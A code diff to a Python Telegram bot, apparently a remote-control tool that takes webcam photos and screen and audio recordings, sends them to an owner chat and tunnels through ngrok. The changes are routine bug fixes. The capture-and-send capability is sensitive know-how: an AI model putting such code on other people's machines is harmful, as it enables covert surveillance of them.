@@ -73,6 +73,7 @@ from os.path import join, abspath, isfile, exists, dirname, realpath, isdir, spl
 
 #TUNNEL HANDLING
 import pyngrok.process
+from pyngrok import ngrok
 from http.server import HTTPServer
 from socketserver import ThreadingMixIn
 from http.server import BaseHTTPRequestHandler, HTTPServer
@@ -923,8 +924,11 @@ class ButtonsMenu:
         return self.message_id
 
     def delete(self):
-        if self.sent:
-            self.bot.deleteMessage((self.chat_id, self.message_id))
+        try:
+            if self.sent:
+                self.bot.deleteMessage((self.chat_id, self.message_id))
+        except TelegramError:
+            ...
 
 """
 oooooooooooo       .o8   o8o      .              .o8       oooo            ooo        ooooo
@@ -1841,12 +1845,14 @@ class PeppinoTelegram:
         func = self.function_table.get(command)
         if func:
             function_needed_args = get_required_params(func)
-            if function_needed_args[0] == "self":
-                function_needed_args=function_needed_args[1:]
+            if function_needed_args:
+                if function_needed_args[0] == "self":
+                    function_needed_args=function_needed_args[1:]
                 
             function_all_args = get_function_parameters(func)
-            if function_all_args[0] == "self":
-                function_all_args=function_all_args[1:]
+            if function_all_args:
+                if function_all_args[0] == "self":
+                    function_all_args=function_all_args[1:]
 
             try:
                 if func in self.no_background_functions:
@@ -2159,7 +2165,8 @@ class PeppinoTelegram:
             video_with_audio.write_videofile(final_filename, logger=None)
             tmploadingmessage = self.new_editable_message("Sending recording...", True)
             with open(final_filename, "rb") as video:
-                self.bot.sendVideo(self.owner_id, video, caption=caption)
+                response = self.bot.sendVideo(self.owner_id, video, caption=caption)
+                self.all_session_messages.append(response["message_id"])
             tmploadingmessage.delete()
             remove(filename)
             remove(audio_filename)
@@ -2206,7 +2213,8 @@ class PeppinoTelegram:
             video_with_audio.write_videofile(final_filename, logger=None)
             tmploadingmessage = self.new_editable_message("Sending recording...", True)
             with open(final_filename, "rb") as video:
-                self.bot.sendVideo(self.owner_id, video, caption=caption)
+                response = self.bot.sendVideo(self.owner_id, video, caption=caption)
+                self.all_session_messages.append(response["message_id"])
             tmploadingmessage.delete()
             remove(filename)
             remove(audio_filename)
@@ -2258,7 +2266,8 @@ class PeppinoTelegram:
             video_with_audio.write_videofile(final_filename, logger=None)#someone must pay for this
             tmploadingmessage = self.new_editable_message("Sending recording...", True)
             with open(final_filename, "rb") as video:
-                self.bot.sendVideo(self.owner_id, video, caption=caption)
+                response = self.bot.sendVideo(self.owner_id, video, caption=caption)
+                self.all_session_messages.append(response["message_id"])
             tmploadingmessage.delete()
             remove(filename)
             remove(audio_filename)
@@ -2298,7 +2307,8 @@ class PeppinoTelegram:
             if not return_value:
                 raise Exception("Could not find camera")
             imwrite(filename, image)
-            self.bot.sendPhoto(self.owner_id, open(filename, "rb"), caption=caption, reply_markup=reply_markup)
+            response = self.bot.sendPhoto(self.owner_id, open(filename, "rb"), caption=caption, reply_markup=reply_markup)
+            self.all_session_messages.append(response["message_id"])
             remove(filename)
             self.closecap()
             return True
@@ -2561,7 +2571,6 @@ if __name__ == "__main__":
     token, chat_id, ngrok_token = getCred() 
     mixer = CustomMixer()
     capture = VideoCapture(0)
-    from pyngrok import ngrok
     pyngrok.process.subprocess.Popen = _patched_popen
     try:
         if ngrok_token.strip():
